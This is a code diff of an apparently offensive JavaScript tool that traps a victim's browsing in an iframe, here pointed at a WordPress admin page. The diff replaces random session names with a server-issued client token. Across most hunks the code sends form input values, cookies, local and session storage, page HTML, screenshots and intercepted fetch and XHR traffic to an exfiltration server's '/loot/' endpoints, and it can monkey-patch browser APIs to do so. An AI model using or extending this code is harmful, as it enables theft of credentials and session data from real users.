@@ -29,8 +29,8 @@ function initGlobals()
 	// load the page the user was on in the iframe
 	// when they reloaded the page. Otherwise,
 	// they'll start here
-	//window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
-	window.taperstartingPage = "https://127.0.0.1:8443/";
+	window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
+	//window.taperstartingPage = "https://127.0.0.1:8443/";
 
 
 
@@ -42,7 +42,7 @@ function initGlobals()
 
 	
 	// Should we try to monkey patch underlying API prototypes?
-	window.monkeyPatchAPIs = true;
+	window.monkeyPatchAPIs = false;
 
 
 	// Helpful variables
@@ -53,8 +53,8 @@ function initGlobals()
 	window.taperloaded = false;
 
 
-	// Client session
-	window.tapersessionName = "";
+	// Client UUID
+	window.taperSessionUUID = "";
 
 	// Cookie storage
 	window.tapercookieStorageDict = {};
@@ -85,96 +85,6 @@ function canAccessIframe(iframe) {
 }
 
 
-// Generate a session identifier
-function initSession()
-{
-		// Values for client session identifiers
-	const AdjectiveList = [
-		"funky",
-		"smelly",
-		"skunky",
-		"merry",
-		"whimsical",
-		"amusing",
-		"hysterical",
-		"bumfuzzled",
-		"bodacious",
-		"absurd",
-		"animated",
-		"brazen",
-		"cheesy",
-		"clownish",
-		"confident",
-		"crazy",
-		"cuckoo",
-		"deranged",
-		"ludicrous",
-		"playful",
-		"quirky",
-		"screwball",
-		"slapstick",
-		"wacky",
-		"excited",
-		"humorous",
-		"charming",
-		"confident",
-		"fanatical"
-		];
-
-	const ColorList = [
-		"blue",
-		"red",
-		"green",
-		"white",
-		"black",
-		"brown",
-		"azure",
-		"pink",
-		"yellow",
-		"silver",
-		"purple",
-		"orange",
-		"grey",
-		"fuchsia",
-		"crimson",
-		"lime",
-		"plum",
-		"olive",
-		"cyan",
-		"ivory",
-		"magenta"
-		];
-
-	const MurderCritter = [
-		"kangaroo",
-		"koala",
-		"dropbear",
-		"wombat",
-		"wallaby",
-		"dingo",
-		"emu",
-		"tassiedevil",
-		"platypus",
-		"salty",
-		"kookaburra",
-		"boxjelly",
-		"blueringoctopus",
-		"taipan",
-		"stonefish",
-		"redback",
-		"cassowary",
-		"funnelwebspider",
-		"conesnail"
-		];
-
-
-	var adjective = AdjectiveList[Math.floor(Math.random()*AdjectiveList.length)];
-	var color = ColorList[Math.floor(Math.random()*ColorList.length)];
-	var murderer = MurderCritter[Math.floor(Math.random()*MurderCritter.length)];
-	tapersessionName = adjective + "-" + color + "-" + murderer;
-}
-
-
 
 // Snag a screenshot and ship it
 function sendScreenshot()
@@ -196,7 +106,7 @@ function sendScreenshot()
 
 		//console.log("About to send image....");
 		request = new XMLHttpRequest();request.addEventListener("load", responseHandler);
-		request.open("POST", taperexfilServer + "/loot/screenshot/" + tapersessionName);
+		request.open("POST", taperexfilServer + "/loot/screenshot/" + taperSessionUUID);
 
 
 		// Helps hide flashing of the page when clicking around
@@ -244,7 +154,7 @@ function hookInputs()
 				inputName = this.name;
 				inputValue = this.value;
 				request = new XMLHttpRequest();
-				request.open("POST", taperexfilServer + "/loot/input/" + tapersessionName);
+				request.open("POST", taperexfilServer + "/loot/input/" + taperSessionUUID);
 				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 				var jsonObj = new Object();
 				jsonObj["inputName"] = inputName;
@@ -307,7 +217,7 @@ function checkCookies()
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/dessert/" + tapersessionName);
+		request.open("POST", taperexfilServer + "/loot/dessert/" + taperSessionUUID);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["cookieName"] = cookieName;
@@ -358,7 +268,7 @@ function checkLocalStorage()
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/localstore/" + tapersessionName);
+		request.open("POST", taperexfilServer + "/loot/localstore/" + taperSessionUUID);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -411,7 +321,7 @@ function checkSessionStorage()
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/sessionstore/" + tapersessionName);
+		request.open("POST", taperexfilServer + "/loot/sessionstore/" + taperSessionUUID);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -430,7 +340,7 @@ function sendHTML()
 	trapHTML = document.getElementById("iframe_a").contentDocument.documentElement.outerHTML;
 
 	request = new XMLHttpRequest();
-	request.open("POST", taperexfilServer + "/loot/html/" + tapersessionName);
+	request.open("POST", taperexfilServer + "/loot/html/" + taperSessionUUID);
 	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 	var jsonObj = new Object();
 	jsonObj["url"] = trapURL;
@@ -491,7 +401,7 @@ function runUpdate()
 		// and take a screenshot maybe, not sure if
 		// screenshot timing will be right yet
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/location/" + tapersessionName);
+		request.open("POST", taperexfilServer + "/loot/location/" + taperSessionUUID);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		
 		var jsonObj = new Object();
@@ -564,7 +474,7 @@ function customFetch(url, options)
 
 	// send setup loot
 	request = new XMLHttpRequest();
-	request.open("POST", taperexfilServer + "/loot/fetchSetup/" + tapersessionName);
+	request.open("POST", taperexfilServer + "/loot/fetchSetup/" + taperSessionUUID);
 	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
 	var jsonObj = new Object();
@@ -580,7 +490,7 @@ function customFetch(url, options)
 
 		// send header loot
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/fetchHeader/" + tapersessionName);
+		request.open("POST", taperexfilServer + "/loot/fetchHeader/" + taperSessionUUID);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
 		var jsonObj = new Object();
@@ -605,7 +515,7 @@ function customFetch(url, options)
 
 			// send API call body loot
 			request = new XMLHttpRequest();
-			request.open("POST", taperexfilServer + "/loot/fetchCall/" + tapersessionName);
+			request.open("POST", taperexfilServer + "/loot/fetchCall/" + taperSessionUUID);
 			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
 			var jsonObj = new Object();
@@ -650,7 +560,7 @@ function monkeyPatch()
 
 		// send loot
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/xhrOpen/" + tapersessionName);
+		request.open("POST", taperexfilServer + "/loot/xhrOpen/" + taperSessionUUID);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
 		var jsonObj = new Object();
@@ -677,7 +587,7 @@ function monkeyPatch()
 
 
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/xhrSetHeader/" + tapersessionName);
+		request.open("POST", taperexfilServer + "/loot/xhrSetHeader/" + taperSessionUUID);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
 		var jsonObj = new Object();
@@ -727,7 +637,7 @@ function monkeyPatch()
 				console.log("Intercepted response: " + data);
 
 				request = new XMLHttpRequest();
-				request.open("POST", taperexfilServer + "/loot/xhrCall/" + tapersessionName);
+				request.open("POST", taperexfilServer + "/loot/xhrCall/" + taperSessionUUID);
 				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
 				var jsonObj = new Object();
@@ -854,21 +764,23 @@ if (window.taperClaimDebug != true)
 	console.log("HTML2CANVAS added to DOM");
 
 
-// Pull in jszip
-// js = document.createElement("script");
-// js.type = "text/javascript";
-// js.src = "http://localhost:8444/lib/compress.js";
-// document.body.appendChild(js);
 
+// Get our client UUID
+	request = new XMLHttpRequest();
+	request.open("GET", taperexfilServer + "/client/getToken", true);
+	request.send(null);
 
-// Pick our session ID
-	initSession();
+	request.onreadystatechange = function()
+	{
+		if (request.readyState == XMLHttpRequest.DONE)
+		{
+			var jsonResponse = JSON.parse(request.responseText);
+    		window.taperSessionUUID = jsonResponse.clientToken;
 
-
-// Trap all the things
-	takeOver();
-
-
+    		// We're ready to trap all the things now
+    		takeOver();
+		}
+	}
 }
 else
 {
